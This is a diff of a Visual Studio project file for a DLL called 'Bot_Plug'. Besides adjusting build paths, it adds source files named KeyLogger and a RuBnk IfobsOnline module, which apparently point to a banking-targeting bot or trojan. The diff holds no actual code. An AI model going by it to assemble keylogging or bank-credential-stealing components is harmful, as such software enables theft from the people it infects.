@@ -18,7 +18,7 @@
 	<Configurations>
 		<Configuration
 			Name="Debug|Win32"
-			OutputDirectory="$(SolutionDir)Bin\$(ConfigurationName)"
+			OutputDirectory="$(SolutionDir)Bin\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="2"
@@ -65,6 +65,7 @@
 				LinkIncremental="2"
 				ModuleDefinitionFile="Bot_Plug.def"
 				GenerateDebugInformation="true"
+				GenerateMapFile="true"
 				SubSystem="2"
 				TargetMachine="1"
 			/>
@@ -93,7 +94,7 @@
 		</Configuration>
 		<Configuration
 			Name="Release|Win32"
-			OutputDirectory="$(SolutionDir)Bin\$(ConfigurationName)"
+			OutputDirectory="$(SolutionDir)Bin\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="0"
@@ -421,6 +422,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\RuBnk\IfobsOnline.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Misc\imbicili.cpp"
 				>
 			</File>
@@ -438,6 +443,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\KeepAlive.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\KeyLogger.cpp"
 				>
 			</File>
 			<File
@@ -747,6 +756,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\RuBnk\IfobsOnline.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Misc\imbicili.h"
 				>
 			</File>
@@ -776,6 +789,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\KeepAlive.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\KeyLogger.h"
 				>
 			</File>
 			<File
